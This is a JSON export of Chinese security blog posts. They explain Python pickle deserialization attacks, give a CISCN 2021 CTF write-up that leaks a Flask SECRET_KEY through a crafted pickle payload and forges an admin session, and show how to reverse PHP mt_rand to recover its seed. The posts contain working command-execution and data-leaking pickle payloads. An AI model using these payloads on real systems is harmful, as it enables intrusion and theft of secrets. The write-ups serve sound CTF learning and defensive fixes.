[{"categories":["Security"],"content":"0x00 前言 最近的比赛遇到过好几次 pickle 反序列化，而且每次都有不同的条件和利用方法，不像 PHP 反序列化有相对固定的操作，就打算简单的总结一下，也方便自己以后断网比赛查资料（x ","date":"2021-06-10","objectID":"/posts/python-pickle-unserialize/:1:0","tags":["Python","pickle 反序列化"],"title":"Python pickle 反序列化安全简述","uri":"/posts/python-pickle-unserialize/"},{"categories":["Security"],"content":"0x01 pickle 基础 模块 pickle 实现了一个 Python 对象结构的二进制序列化和反序列化。 “pickling” 是将 Python 对象及其所拥有的层次结构转化为一个字节流的过程，而 “unpickling” 是相反的操作，会将（来自一个 binary file 或者 bytes-like object 的）字节流转化回一个对象层次结构。 pickling（和 unpickling）也被称为“序列化”, “编组” 或者 “平面化”。而为了避免混乱，此处采用术语 “封存 (pickling)” 和 “解封 (unpickling)”。 简单来说，pickle 序列化就是将一个 python 对象变成可以持久化储存的二进制数据，反序列化即为相反的操作，将二进制数据转回 python 对象。 简单的序列化与反序列化可以使用 pickle 模块直接提供的函数 pickle.dump(obj, file, protocol=None, *, fix_imports=True, buffer_callback=None) pickle.dumps(obj, protocol=None, *, fix_imports=True, buffer_callback=None) pickle.load(file, *, fix_imports=True, encoding=\"ASCII\", errors=\"strict\", buffers=None) pickle.loads(data, /, *, fix_imports=True, encoding=\"ASCII\", errors=\"strict\", buffers=None) 其中前两个函数用于序列化，后两个函数用于反序列化，后缀 s 表示序列化数据写入 bytes 变量或反序列化数据来自 bytes-like object，不带后缀 s 则表示写入或读取 file object 若要对序列化或反序列化操作进行进一步的自定义，则可以通过继承 pickle 模块提供的序列化与反序列化类并实现一些特殊方法进行处理 class pickle.Pickler(file, protocol=None, *, fix_imports=True, buffer_callback=None) class pickle.Unpickler(file, *, fix_imports=True, encoding=\"ASCII\", errors=\"strict\", buffers=None) 这两种方法只能接收 file object 作为写入或读取的参数，可以直接调用对应的 dump 或 load 函数进行操作 CTF 比赛中常通过继承 Unpickler 类并实现 find_class 方法来对输入进行过滤或修改，从而起到增强安全性的作用 比如 2021 年国赛西南分区赛的这道 Web 题，便是采用了这种方法进行过滤，之后也会以这道题为例介绍反序列化的利用方法 class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): # Only allow safe classes if module in ['settings'] and \"__\" not in name: return getattr(sys.modules[module], name) # Forbid everything else. raise pickle.UnpicklingError(\"global '%s.%s' is forbidden\" % (module, name)) 还有一种方法是通过对输入中一些敏感的 opcode 进行过滤，下一章会介绍这些 opcode ","date":"2021-06-10","objectID":"/posts/python-pickle-unserialize/:2:0","tags":["Python","pickle 反序列化"],"title":"Python pickle 反序列化安全简述","uri":"/posts/python-pickle-unserialize/"},{"categories":["Security"],"content":"0x02 opcode 简介 要想深入了解安全问题，当然要从源码开始看起，这里我的 pickle 源码在 /usr/lib/python3.9/pickle.py 中 pickle 有多个 Protocol，新的 Protocol 会比旧的多一些 opcode，但目前依然向下兼容，其中 Protocol 1 中 opcode 均为可见字符，之后新的 Protocol 中的 opcode 大部分均为不可见字符，目前最新版本为 Protocol 5，但直到 python3.9 默认使用的仍为 Protocol 4 pickle 源码中列出了各种 opcode 及其进行的操作 # Pickle opcodes. See pickletools.py for extensive docs. The listing # here is in kind-of alphabetical order of 1-character pickle code. # pickletools groups them by purpose. MARK = b'(' # push special markobject on stack STOP = b'.' # every pickle ends with STOP POP = b'0' # discard topmost stack item POP_MARK = b'1' # discard stack top through topmost markobject DUP = b'2' # duplicate top stack item FLOAT = b'F' # push float object; decimal string argument INT = b'I' # push integer or bool; decimal string argument BININT = b'J' # push four-byte signed int BININT1 = b'K' # push 1-byte unsigned int LONG = b'L' # push long; decimal string argument BININT2 = b'M' # push 2-byte unsigned int NONE = b'N' # push None PERSID = b'P' # push persistent object; id is taken from string arg BINPERSID = b'Q' # \" \" \" ; \" \" \" \" stack REDUCE = b'R' # apply callable to argtuple, both on stack STRING = b'S' # push string; NL-terminated string argument BINSTRING = b'T' # push string; counted binary string argument SHORT_BINSTRING= b'U' # \" \" ; \" \" \" \" \u003c 256 bytes UNICODE = b'V' # push Unicode string; raw-unicode-escaped'd argument BINUNICODE = b'X' # \" \" \" ; counted UTF-8 string argument APPEND = b'a' # append stack top to list below it BUILD = b'b' # call __setstate__ or __dict__.update() GLOBAL = b'c' # push self.find_class(modname, name); 2 string args DICT = b'd' # build a dict from stack items EMPTY_DICT = b'}' # push empty dict APPENDS = b'e' # extend list on stack by topmost stack slice GET = b'g' # push item from memo on stack; index is string arg BINGET = b'h' # \" \" \" \" \" \" ; \" \" 1-byte arg INST = b'i' # build \u0026 push class instance LONG_BINGET = b'j' # push item from memo on stack; index is 4-byte arg LIST = b'l' # build list from topmost stack items EMPTY_LIST = b']' # push empty list OBJ = b'o' # build \u0026 push class instance PUT = b'p' # store stack top in memo; index is string arg BINPUT = b'q' # \" \" \" \" \" ; \" \" 1-byte arg LONG_BINPUT = b'r' # \" \" \" \" \" ; \" \" 4-byte arg SETITEM = b's' # add key+value pair to dict TUPLE = b't' # build tuple from topmost stack items EMPTY_TUPLE = b')' # push empty tuple SETITEMS = b'u' # modify dict by adding topmost key+value pairs BINFLOAT = b'G' # push float; arg is 8-byte float encoding TRUE = b'I01\\n' # not an opcode; see INT docs in pickletools.py FALSE = b'I00\\n' # not an opcode; see INT docs in pickletools.py # Protocol 2 PROTO = b'\\x80' # identify pickle protocol NEWOBJ = b'\\x81' # build object by applying cls.__new__ to argtuple EXT1 = b'\\x82' # push object from extension registry; 1-byte index EXT2 = b'\\x83' # ditto, but 2-byte index EXT4 = b'\\x84' # ditto, but 4-byte index TUPLE1 = b'\\x85' # build 1-tuple from stack top TUPLE2 = b'\\x86' # build 2-tuple from two topmost stack items TUPLE3 = b'\\x87' # build 3-tuple from three topmost stack items NEWTRUE = b'\\x88' # push True NEWFALSE = b'\\x89' # push False LONG1 = b'\\x8a' # push long from \u003c 256 bytes LONG4 = b'\\x8b' # push really big long _tuplesize2code = [EMPTY_TUPLE, TUPLE1, TUPLE2, TUPLE3] # Protocol 3 (Python 3.x) BINBYTES = b'B' # push bytes; counted binary string argument SHORT_BINBYTES = b'C' # \" \" ; \" \" \" \" \u003c 256 bytes # Protocol 4 SHORT_BINUNICODE = b'\\x8c' # push short string; UTF-8 length \u003c 256 bytes BINUNICODE8 = b'\\x8d' # push very long string BINBYTES8 = b'\\x8e' # push very long bytes string EMPTY_SET = b'\\x8f' # push empty set on the stack ADDITEMS = b'\\x90' # modify set by adding topmost stack items FROZENSET = b'\\x91' # build frozenset from topmost stack items NEWOBJ_EX = b'\\x92' # like NEWOBJ but work with keyword only arguments STACK_GLOBAL = b'\\x93' # same as GLOBAL but using names on the stacks MEMOIZE = b'\\x94' # store top of the stack in","date":"2021-06-10","objectID":"/posts/python-pickle-unserialize/:3:0","tags":["Python","pickle 反序列化"],"title":"Python pickle 反序列化安全简述","uri":"/posts/python-pickle-unserialize/"},{"categories":["Security"],"content":"0x03 利用方法 根据我目前遇到过的情况 (一般在 CTF 题中)，pickle 反序列化主要有以下几种常见的利用方法 ","date":"2021-06-10","objectID":"/posts/python-pickle-unserialize/:4:0","tags":["Python","pickle 反序列化"],"title":"Python pickle 反序列化安全简述","uri":"/posts/python-pickle-unserialize/"},{"categories":["Security"],"content":"执行恶意命令 执行恶意命令是 pickle 反序列化最简单也是最危险的利用方法，可以直接通过 __reduce__ 方法进行利用 import os import pickle class Evil(): def __reduce__(self): return (os.system, ('whoami',)) print(pickle.dumps(Evil())) 将输出的序列化数据进行反序列化即可执行 os.system('whoami')，此种方法操作简单但局限性较大，需要反序列化执行环境引入所需的库，且只能执行一次函数调用，因此常使用手写 opcode 的方法进行利用，这里推荐一个库 pker，可以自动生成 opcode，还是挺方便的 我就以反序列化执行环境未导入 os 模块举例，在这种情况下执行 os.system('whoami') c__builtin__ getattr (c__builtin__ __import__ (S'os' tRS'system' tR(S'whoami' tR. 其中 1~2 行获取 __builtin__.getattr 函数， 3~6 行通过 __builtin__.__import__ 函数导入 os 模块，第 6~7 行获取 os.system 函数，7~8 行通过调用 os.system 函数实现任意命令执行，成功在未导入 os 模块的情况下执行 os.system 函数 手写 opcode 在未导入 os 模块的情况下执行 os.system 函数os \" 手写 opcode 在未导入 os 模块的情况下执行 os.system 函数 若使用 pker 库生成，则对应代码为 os = GLOBAL('__builtin__', '__import__')('os') system = GLOBAL('__builtin__', 'getattr')(os, 'system') system('whoami') return ","date":"2021-06-10","objectID":"/posts/python-pickle-unserialize/:4:1","tags":["Python","pickle 反序列化"],"title":"Python pickle 反序列化安全简述","uri":"/posts/python-pickle-unserialize/"},{"categories":["Security"],"content":"修改全局变量 通过 c 操作码可以获取到任意对象，b 操作码可以对任意对象进行修改，此时就可以获取全局对象并进行修改 若为普通对象则可以直接用 b 操作码进行修改，参考 opcode 简介一节中的介绍 这里讨论 dict list 等没有 __dict__ 属性的对象的情况，可以通过获取其 update append 等函数进行修改，比如下面的示例代码 secret = {'ADMIN': 0} def get_flag(): if secret.ADMIN == 1: print(flag) 这里 secret 是全局对象，假设我们没有正常途径修改这个变量，但是有一个输入可控的 pickle 反序列化，我们就可以通过构造 opcode 修改该变量 构造 opcode 如下，最终调用函数为 __main__.secret.update({'ADMIN': 1}) c__builtin__ getattr (c__main__ secret S'update' tR((S'ADMIN' I1 dtR. 其中 1~2 行获取 __builtin__.getattr 函数，3~4 行获取 secret 变量，5~6 行获取 secret.update 函数，6~8 行调用该函数将 ADMIN 设为 1 通过调用 dict 对象的 update 方法修改全局变量secret \" 通过调用 dict 对象的 update 方法修改全局变量 若使用 pker 库生成，则对应代码为 secret = GLOBAL('__main__', 'secret') update = GLOBAL('__builtin__', 'getattr')(secret, 'update') update({'ADMIN': 1}) return ","date":"2021-06-10","objectID":"/posts/python-pickle-unserialize/:4:2","tags":["Python","pickle 反序列化"],"title":"Python pickle 反序列化安全简述","uri":"/posts/python-pickle-unserialize/"},{"categories":["Security"],"content":"获取其它模块中的隐私数据 通过 c 操作码还可以获取到其它模块中的隐私数据，比如 2021 年国赛西南分区赛 Web3 from settings import SECRET_KEY, User, ADMIN_PASSWORD …… @app.route('/load') def loads(): data = request.args.get('data', '') if data: Haha = restricted_loads(base64.b64decode(data)) assert isinstance(Haha, User) if Haha.password == ADMIN_PASSWORD: return render_template('index.html', msg=Haha.msg) return render_template('index.html', msg=\"\u003cimg src='\" + url_for('static', filename='img/2.jpeg') + \"'\u003e\u003cbr\u003e给👴🏻爬\") return render_template('index.html', msg=\"\u003cimg src='\" + url_for('static', filename='img/2.jpeg') + \"'\u003e\u003cbr\u003e儒 雅 随 和\") 我们可以通过获取 settings.ADMIN_PASSWORD settings.SECRET_KEY 并分别赋给 Haha.password Haha.msg 的方法泄露 SECRET_KEY，再以此进行后续操作 这题不知道为什么直接用 V0 版本的序列化数据会 500 (也有可能是我当时写的有问题)，所以现场分析了一下默认版本 V4 的字节码然后手改了一下最后过了，具体分析详见这篇文章 CISCN 2021 西南分区赛 Web3 Break\u0026Fix 这里就简单写一下应该可以用的 pker 对应代码 User = GLOBAL('__main__', 'User') Haha = OBJ(User) Haha.password = GLOBAL('settings', 'ADMIN_PASSWORD') Haha.msg = GLOBAL('settings', 'SECRET_KEY') return Haha ","date":"2021-06-10","objectID":"/posts/python-pickle-unserialize/:4:3","tags":["Python","pickle 反序列化"],"title":"Python pickle 反序列化安全简述","uri":"/posts/python-pickle-unserialize/"},{"categories":["Security"],"content":"0x04 后记 由于我自己对 Python 的了解程度很一般，用到 pickle 反序列化的地方也不是很多，很多地方理解的不是很到位，写的也不是很清楚，所以这篇随便糊的文章仅供参考，如有错误请大佬们轻喷 ","date":"2021-06-10","objectID":"/posts/python-pickle-unserialize/:5:0","tags":["Python","pickle 反序列化"],"title":"Python pickle 反序列化安全简述","uri":"/posts/python-pickle-unserialize/"},{"categories":["WriteUp"],"content":"0x00 前言 一次体验还可以的线下，一共就出了两个 Web 题还都是一血就很开心，由于 Web1 过于简单 (sqlmap 一把梭了)，而 Web2 由于前半部分没有做出来，仅仅对其后半部分 (还原 PHP mt_rand 种子) 进行了分析，这里就只具体分析一下 Web3 ","date":"2021-06-10","objectID":"/posts/ciscn-2021-ws-web3/:1:0","tags":["CISCN 2021","Web 安全","Python","Flask","pickle 反序列化"],"title":"CISCN 2021 西南分区赛 Web3 Break\u0026Fix WriteUp","uri":"/posts/ciscn-2021-ws-web3/"},{"categories":["WriteUp"],"content":"0x01 Break ","date":"2021-06-10","objectID":"/posts/ciscn-2021-ws-web3/:2:0","tags":["CISCN 2021","Web 安全","Python","Flask","pickle 反序列化"],"title":"CISCN 2021 西南分区赛 Web3 Break\u0026Fix WriteUp","uri":"/posts/ciscn-2021-ws-web3/"},{"categories":["WriteUp"],"content":"源码泄露及分析 扫目录发现 /backup 打开发现源码泄露 from flask import Flask, request, session, render_template, url_for import pickle import io import sys import base64 from settings import SECRET_KEY, User, ADMIN_PASSWORD app = Flask(__name__) app.config.update(dict( SECRET_KEY=SECRET_KEY, )) app.config.from_envvar('FLASKR_SETTINGS', silent=True) class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): # Only allow safe classes if module in ['settings'] and \"__\" not in name: return getattr(sys.modules[module], name) # Forbid everything else. raise pickle.UnpicklingError(\"global '%s.%s' is forbidden\" % (module, name)) def restricted_loads(s): \"\"\"Helper function analogous to pickle.loads().\"\"\" return RestrictedUnpickler(io.BytesIO(s)).load() # index @app.route('/') @app.route('/index') def index(): if session.get('logged_in', None): name = session.get('name') if name == 'admin': return render_template('index.html', msg=open('/flag').read()) else: session['logged_in'] = 0 session['name'] = 'Anonymous' msg = '\u003cimg src=\"' + url_for('static', filename='img/1.jpeg') + '\"\u003e\u003cbr\u003ePlease Login First, {} ' return render_template('index.html', msg=msg.format(session.get('name'))) # load @app.route('/load') def loads(): data = request.args.get('data', '') if data: Haha = restricted_loads(base64.b64decode(data)) assert isinstance(Haha, User) if Haha.password == ADMIN_PASSWORD: return render_template('index.html', msg=Haha.msg) return render_template('index.html', msg=\"\u003cimg src='\" + url_for('static', filename='img/2.jpeg') + \"'\u003e\u003cbr\u003e给👴🏻爬\") return render_template('index.html', msg=\"\u003cimg src='\" + url_for('static', filename='img/2.jpeg') + \"'\u003e\u003cbr\u003e儒 雅 随 和\") @app.route('/backup') def hint(): return open(__file__, 'rb').read() if __name__ == '__main__': app.run(host='0.0.0.0',debug=False,port=5001) 看源码发现两个值得注意的地方，第一个地方是 index 函数中通过 session 判断身份，若 session['name'] 的值为 admin 则输出 flag，猜测需要 flask session 伪造，那么就需要知道 SECRET_KEY 的值，第二个地方是 loads 函数中存在 pickle 反序列化，查看 RestrictedUnpickler 类发现 find_class 限制 module 必须为 settings 而 name 中不能含有 __，而 return render_template('index.html', msg=Haha.msg) 处存在一个可控的输出点 分析之后我们的做题逻辑就很清晰，第一步通过 pickle 反序列化泄露 SECRET_KEY，第二步伪造 session 输出 flag ","date":"2021-06-10","objectID":"/posts/ciscn-2021-ws-web3/:2:1","tags":["CISCN 2021","Web 安全","Python","Flask","pickle 反序列化"],"title":"CISCN 2021 西南分区赛 Web3 Break\u0026Fix WriteUp","uri":"/posts/ciscn-2021-ws-web3/"},{"categories":["WriteUp"],"content":"pickle 反序列化 对于 pickle 反序列化的介绍在这篇文章中：Python pickle 反序列化安全简述 正如上文说的，V0 版本的序列化数据会 500，现场分析了一下默认版本 V4 的字节码然后手改了一下然后过了，这里写一下我手改 V4 版本序列化数据的过程，也算是一个分析 pickle 序列化数据的示例 首先写一个测试用的 User 类 # settings.py class User: def __init__(self): self.password = \"password\" self.msg = \"msg\" # app.py from settings import User import pickle print(pickle.dumps(User())) 并得到反序列化数据 \\x80\\x04\\x952\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x08settings\\x94\\x8c\\x04User\\x94\\x93\\x94)\\x81\\x94}\\x94(\\x8c\\x08password\\x94h\\x05\\x8c\\x03msg\\x94h\\x06ub. 对其进行简单分析 \\x80\\x04\\x952\\x00\\x00\\x00\\x00\\x00\\x00\\x00 为版本描述和创建 frame（总的来说就是初始化 \\x8c\\x08settings\\x94 入栈字符串并放入内存中，其中 \\x8c 为入栈短字符串操作符，\\x08 为字符串长度 (故最长 256 字节)，后面跟字符串，\\x94 将栈顶元素放入 memo 中 (索引为递增的 1-byte 数字) \\x8c\\x04User\\x94 \\x8c\\x08password\\x94 \\x8c\\x03msg\\x94 同理 pickle 默认将栈中变量放入 memo 中，也可以不放 \\x93 与 c 操作符作用相同，区别在于 c 操作符参数需要传入，\\x93 操作符使用栈顶两个元素作为参数，如这里 \\x8c\\x08settings\\x94\\x8c\\x04User\\x94\\x93\\x94 即获取 settings.User \\x81 与 o 和 i 作用相同，可用于创建类的实例，但是调用 __new__ 方法创建，使用栈顶两个参数，栈顶参数为所调用参数，需要为 tuple，后一个参数为一个类对象，如这里 \\x8c\\x08settings\\x94\\x8c\\x04User\\x94\\x93\\x94)\\x81\\x94 即调用了 settings.User.__new__() 创建了一个 settings.User 的实例 }\\x94(\\x8c\\x08password\\x94h\\x05\\x8c\\x03msg\\x94h\\x06ub 大部分用到的操作码都介绍过，这里 h\\x05 和 h\\x06 获取到的就是前边刚放入的 ‘password’ 和 ‘msg’ 字符串，这一部分即创建一个 dict： {'password': 'password', 'msg': 'msg'}，然后作为参数通过 b 操作码更新前面创建的实例 分析到这里各部分的作用都已经很清晰了，而我们要做的很简单，就是把最后创建的 dict 中两个值 h\\x05 h\\x06 分别换为 settings.ADMIN_PASSWORD 和 settings.SECRET_KEY，即最后创建的 dict 为 {'password': settings.ADMIN_PASSWORD, 'msg': settings.SECRET_KEY} 这里我选择用了比较 V4 的方法获取，以获取 settings.ADMIN_PASSWORD 为例，我使用了 \\x8c\\x08settings\\x94\\x8c\\x0eADMIN_PASSWORD\\x94\\x93\\x94 （其实就是把获取 settings.User 时候的操作码拿过来改一下 最终得到非常 V4 的序列化数据如下 \\x80\\x04\\x952\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x08settings\\x94\\x8c\\x04User\\x94\\x93\\x94)\\x81\\x94}\\x94(\\x8c\\x08password\\x94\\x8c\\x08settings\\x94\\x8c\\x0eADMIN_PASSWORD\\x94\\x93\\x94\\x8c\\x03msg\\x94\\x8c\\x08settings\\x94\\x8c\\nSECRET_KEY\\x94\\x93\\x94ub. base64 encode 一下传进去就可以拿到 SECRET_KEY 了 ","date":"2021-06-10","objectID":"/posts/ciscn-2021-ws-web3/:2:2","tags":["CISCN 2021","Web 安全","Python","Flask","pickle 反序列化"],"title":"CISCN 2021 西南分区赛 Web3 Break\u0026Fix WriteUp","uri":"/posts/ciscn-2021-ws-web3/"},{"categories":["WriteUp"],"content":"session 伪造 这一步就非常简单了，用这个库 Flask Session Cookie Decoder/Encoder 解一下 Cookie 中的 session 得到 {\"logged_in\":0,\"name\":\"Anonymous\"} 修改成如下数据然后再用上述库和上一步得到的 SECRET_KEY 得到新的 session 值 {\"logged_in\":1,\"name\":\"admin\"} 替换掉 Cookie 中的 session 访问 /index 即可得到 flag ","date":"2021-06-10","objectID":"/posts/ciscn-2021-ws-web3/:2:3","tags":["CISCN 2021","Web 安全","Python","Flask","pickle 反序列化"],"title":"CISCN 2021 西南分区赛 Web3 Break\u0026Fix WriteUp","uri":"/posts/ciscn-2021-ws-web3/"},{"categories":["WriteUp"],"content":"0x02 Fix 这题 Fix 的思路就非常简单了 源码的第 19~20 行是对反序列化进行限制的主要部分，限制了 module 和 name，只需要在 if 里加一个条件过滤掉 SECRET_KEY 和 ADMIN_PASSWORD 即可，即将第 19 行改为如下代码 if module in ['settings'] and \"__\" not in name and name not in ['SECRET_KEY', 'ADMIN_PASSWORD']: ","date":"2021-06-10","objectID":"/posts/ciscn-2021-ws-web3/:3:0","tags":["CISCN 2021","Web 安全","Python","Flask","pickle 反序列化"],"title":"CISCN 2021 西南分区赛 Web3 Break\u0026Fix WriteUp","uri":"/posts/ciscn-2021-ws-web3/"},{"categories":["WriteUp"],"content":"0x03 后记 这次比赛感觉 Web 题整体偏难，全场也只有 Web1 和 Web3 有解，可能是因为断网的原因吧，网一断确实就不会做题了（x 但是整体比赛体验还是很不错的，除了泥电宾馆会议室那个破空调是真的不行，打个比赛差点没中暑，强烈吐槽 哦，还有零食太少了，建议决赛来个零食大礼包 ","date":"2021-06-10","objectID":"/posts/ciscn-2021-ws-web3/:4:0","tags":["CISCN 2021","Web 安全","Python","Flask","pickle 反序列化"],"title":"CISCN 2021 西南分区赛 Web3 Break\u0026Fix WriteUp","uri":"/posts/ciscn-2021-ws-web3/"},{"categories":["Security"],"content":"0x00 前言 今年国赛分区赛遇到一个还原 PHP mt_rand 种子的题（由于太菜了 break 的时候根本没有做到这一步 这一部分的源码是这样的 \u003c?php foreach (scandir('.') as $i) { if (strlen($i) === 36) { include $i; } } if (!isset($_GET['pass'])) { echo $style3.\"需要登录\u003c/br\u003e\\n\"; die($form); } if ($_GET['pass'] !== 'nya_nop_nya~') { echo $style3.\"密码错误. 为什么不回去看看呢?\u003c/br\u003e\\n\"; die($form); } echo $style2; mt_srand(rand(10000000, 99999999)); echo \"\u003cnya\u003e你要的flag!\u003c/br\u003e\\n\"; echo openssl_encrypt($flag, 'aes-256-cfb', mt_rand(), 0, mt_rand()); echo \"\\n\u003c/br\u003e看不懂?不如来抽卡吧!\u003c/br\u003e\\n\" . $form2; for ($i = 0; $i \u003c $_GET['roll']; $i += 1) { echo mt_rand() . \" \"; } echo \"\\n\u003c/nya\u003e\"; 通过后续产生的随机数还原出随机数种子，然后得到加密的密钥和 IV 这里有两种攻击思路：第一种就是爆破，反正种子就 8 位整数，爆破就是费点时间；第二种就是通过 mt_rand 的规律还原种子 之前看到过大佬写的不用爆破还原随机数种子的文章：BREAKING PHP’S MT_RAND() WITH 2 VALUES AND NO BRUTEFORCE，这里跟着大佬的思路自己分析一下 ","date":"2021-06-07","objectID":"/posts/php-mt_rand-break/:1:0","tags":["PHP","mt_rand"],"title":"还原 PHP mt_rand 种子","uri":"/posts/php-mt_rand-break/"},{"categories":["Security"],"content":"0x01 从源码开始 mt_rand 相关的函数在 ext/stadard/mt_rand.c 中，其中 mt_rand 对应的函数如下 mt_rand 函数mt_rand \" mt_rand 函数 php_mt_rand 函数php_mt_rand \" php_mt_rand 函数 其中 BG 宏的定义在 ext/standard/mt_rand.c 中，大概就是获取类似全局变量的东西 BG 宏定义BG \" BG 宏定义 用于设置随机数种子的 php_mt_srand 的源码如下 php_mt_srand 函数php_mt_srand \" php_mt_srand 函数 其中 state 变量为初始化后的状态向量，储存产生的随机数 php_mt_initialize 和 php_mt_reload 的源码如下 php_mt_initializephp_mt_initialize \" php_mt_initialize php_mt_reload 函数php_mt_reload \" php_mt_reload 函数 其中 MT_RAND_MT19937 定义在 ext/standard/php_mt_rand.h 中 MT_RAND_MT19937MT_RAND_MT19937 \" MT_RAND_MT19937 选择模式的操作在 mt_srand 函数中，默认为 MT19937 模式使用 twist 宏，若选择 1 则为 PHP 模式使用 twist_php 宏 mt_srand 函数mt_srand \" mt_srand 函数 其中一些全局变量和宏的定义如下 全局变量和宏macros and global variables \" 全局变量和宏 MT_N 定义在 ext/standard/basic_functions.h 中，为初始化产生的状态向量的长度 MT_NMT_N \" MT_N php_mt_initialize 函数的作用很简单，产生初始的状态向量，每个值都由它前一个值生成，第一个值为输入的种子 php_mt_reload 函数对初始状态向量进行混合，产生 N 个新的值作为被 mt_rand 使用的随机数 php_mt_rand 函数再对这些值进行简单的处理生成最终的随机数 ","date":"2021-06-07","objectID":"/posts/php-mt_rand-break/:2:0","tags":["PHP","mt_rand"],"title":"还原 PHP mt_rand 种子","uri":"/posts/php-mt_rand-break/"},{"categories":["Security"],"content":"0x02 从后往前看 ","date":"2021-06-07","objectID":"/posts/php-mt_rand-break/:3:0","tags":["PHP","mt_rand"],"title":"还原 PHP mt_rand 种子","uri":"/posts/php-mt_rand-break/"},{"categories":["Security"],"content":"mt_rand 首先从被调用的 mt_rand 开始分析，mt_rand 返回的随机数为 php_mt_rand 返回值右移一位 RETURN_LONG(php_mt_rand() \u003e\u003e 1); 由于右移后其最低位丢失，故一个输出的随机数对应两种可能的 php_mt_rand 返回值，其最低位分别为 0 和 1 ","date":"2021-06-07","objectID":"/posts/php-mt_rand-break/:3:1","tags":["PHP","mt_rand"],"title":"还原 PHP mt_rand 种子","uri":"/posts/php-mt_rand-break/"},{"categories":["Security"],"content":"php_mt_rand php_mt_rand 返回值为经过处理的 php_mt_reload 中产生的值，其中进行处理的代码如下 s1 ^= (s1 \u003e\u003e 11); s1 ^= (s1 \u003c\u003c 7) \u0026 0x9d2c5680U; s1 ^= (s1 \u003c\u003c 15) \u0026 0xefc60000U; return ( s1 ^ (s1 \u003e\u003e 18) ); // s1 ^= (s1 \u003e\u003e 18); 这四条代码均为可逆操作 s1 ^= (s1 \u003e\u003e 11) 结果高 11 位与原值高 11 位相同，结果低 21 位为原值高 21 位与低 21 位异或结果 故其逆操作如下 s1 ^= (s1 \u003e\u003e 11); // 恢复 10~20 位 s1 ^= (s1 \u003e\u003e 22); // 恢复 0~9 位 (低 10 位) s1 ^= (s1 \u003c\u003c 7) \u0026 0x9d2c5680U 其逆操作如下 s2 = (s1 \u003c\u003c 21) ^ (((s1 \u003c\u003c 7) \u0026 0x9d2c5680U) \u003c\u003c 21); // 恢复高 11 位 s2 = (s1 \u003c\u003c 14) ^ (s2 \u0026 (0x9d2c5680U \u003c\u003c 14)); // 恢复 14~20 位 s2 = (s1 \u003c\u003c 7) ^ (s2 \u0026 (0x9d2c5680U \u003c\u003c 7)); // 恢复 7~13 位 s1 ^= s2 \u0026 0x9d2c5680U; // 恢复低 7 位 s1 ^= (s1 \u003c\u003c 15) \u0026 0xefc60000U 结果高 16 位为原值 1~16 位与 0xefc6 相与并与原值高 16 位异或的结果，低 16 位与原值低 16 位相同 故其逆操作与原操作相同 s1 ^= (s1 \u003c\u003c 15) \u0026 0xefc60000U; // 恢复高 16 位 s1 ^= (s1 \u003e\u003e 18) 结果高 18 位与原值高 18 位相同，结果低 14 位为原值高 14 位与低 14 位异或结果 故其逆操作与原操作相同 s1 ^= (s1 \u003e\u003e 18); // 恢复低 14 位 结合以上四步得到 php_mt_rand 中处理操作的逆操作 uint32_t reverse_php_mt_rand(uint32_t s1) { s1 ^= (s1 \u003e\u003e 18); s1 ^= (s1 \u003c\u003c 15) \u0026 0xefc60000U; s2 = (s1 \u003c\u003c 21) ^ (((s1 \u003c\u003c 7) \u0026 0x9d2c5680U) \u003c\u003c 21); s2 = (s1 \u003c\u003c 14) ^ (s2 \u0026 (0x9d2c5680U \u003c\u003c 14)); s2 = (s1 \u003c\u003c 7) ^ (s2 \u0026 (0x9d2c5680U \u003c\u003c 7)); s1 ^= s2 \u0026 0x9d2c5680U; s1 ^= (s1 \u003e\u003e 11); s1 ^= (s1 \u003e\u003e 22); return s1; } ","date":"2021-06-07","objectID":"/posts/php-mt_rand-break/:3:2","tags":["PHP","mt_rand"],"title":"还原 PHP mt_rand 种子","uri":"/posts/php-mt_rand-break/"},{"categories":["Security"],"content":"php_mt_reload 代码中的循环分为两部分，输出状态向量中前 N-M (227) 个值与后 M (397) 个值的产生方法不同 且对于后 M (397) 个值，state_reload[i] 与 state_reload[i-227] 存在一定的关联，即 state_reload[i] = twist(state_reload[i-227], state[i], state[i+1]) 其中用到的宏如下 #define hiBit(u) ((u) \u0026 0x80000000U) /* mask all but highest bit of u */#define loBit(u) ((u) \u0026 0x00000001U) /* mask all but lowest bit of u */#define loBits(u) ((u) \u0026 0x7FFFFFFFU) /* mask the highest bit of u */#define mixBits(u, v) (hiBit(u)|loBits(v)) /* move hi bit of u to hi bit of v */#define twist(m,u,v) (m ^ (mixBits(u,v)\u003e\u003e1) ^ ((uint32_t)(-(int32_t)(loBit(v))) \u0026 0x9908b0dfU)) #define twist_php(m,u,v) (m ^ (mixBits(u,v)\u003e\u003e1) ^ ((uint32_t)(-(int32_t)(loBit(u))) \u0026 0x9908b0dfU)) MT_RAND_MT19937 模式 对于右半部分，当 state[i+1] 最低位为 0 时，右半部分为 0，当 state[i+1] 最低位为 1 时，右半部分为 0x9908b0dfU 由于 0x9908b0dfU 最高位为 1，所以右半部分最高位与 state[i+1] 最低位相同 又由于 mixBits(u,v)\u003e\u003e1 最高位一定为0，若我们已知 state_reload[i] 与 state_reload[i-227]，则 state_reload[i] ^ state_reload[i-227] 最高位与右半部分最高位即与 state[i+1] 最低位相同 进而求出 mixBits(u,v) \u003e\u003e 1 的值，该值的低 30 位为 state[i+1] 的 1~30 位，30 位为 state[i] 的最高位 此时我们已知 state[i+1] 的低 31 位，则该值共有两种情况，我们可以根据这两种情况分别求出对应的种子 (通过分析 php_mt_initialize 函数)，利用该种子生成的 state_reload 与已知值比较，确定正确的种子值 MT_RAND_PHP 模式 由于右半部分最高位与 state[i] 最高位相同，所以可以只能得到 state[i+1] 的 1~31 位，共有四种情况 ","date":"2021-06-07","objectID":"/posts/php-mt_rand-break/:3:3","tags":["PHP","mt_rand"],"title":"还原 PHP mt_rand 种子","uri":"/posts/php-mt_rand-break/"},{"categories":["Security"],"content":"php_mt_initialize php_mt_initialize 比较简单，每一个值都只与前一个值相关，其生成过程为 state[i] = (0x6c078965U * (state[i-1] ^ (state[i-1] \u003e\u003e 30)) + i) \u0026 0xffffffffU; 其中 \u0026 0xffffffffU 操作等价于 % 0X100000000U 求得 0x6c078965 对于模 0x100000000 的逆为 0x9638806d 故该操作的逆操作为 state[i-1] = (0x9638806dU * (state[i] - i)) \u0026 0xffffffffU; state[i-1] ^= state[i-1] \u003e\u003e 30; 